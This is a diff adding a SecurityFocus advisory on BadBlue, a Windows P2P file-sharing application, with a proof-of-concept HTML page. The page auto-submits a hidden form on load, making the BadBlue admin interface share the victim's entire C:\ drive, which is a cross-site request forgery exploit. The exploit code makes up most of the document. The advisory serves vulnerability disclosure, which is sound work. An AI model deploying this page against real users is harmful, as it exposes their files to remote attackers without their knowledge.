@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/5276/info
+
+BadBlue is a P2P file sharing application distributed by Working Resources. It is available for Microsoft Windows operating systems.
+
+BadBlue does not sufficiently control access to the administrative interface. It is possible to remotely add the entire drive of a system running a vulnerable BadBlue implementation via a maliciously crafted web page containing a form POST method. This would allow remote users to via the contents of the drive with the privileges of the BadBlue server.
+
+<HTML>
+<HEAD>
+<FORM ACTION=http://localhost/ext.dll METHOD=GET>
+<INPUT TYPE=hidden NAME=MfcISAPICommand VALUE=LoadPage>
+<INPUT TYPE=hidden NAME=page VALUE=dir.hts>
+<INPUT TYPE=hidden NAME=a0 VALUE=add>
+<INPUT TYPE=hidden NAME=a2 VALUE=hd>
+<INPUT TYPE=hidden NAME=a1 VALUE=C:\>
+</FORM>
+</HEAD>
+<BODY ONLOAD="document.forms(0).submit()" />
+</HTML>
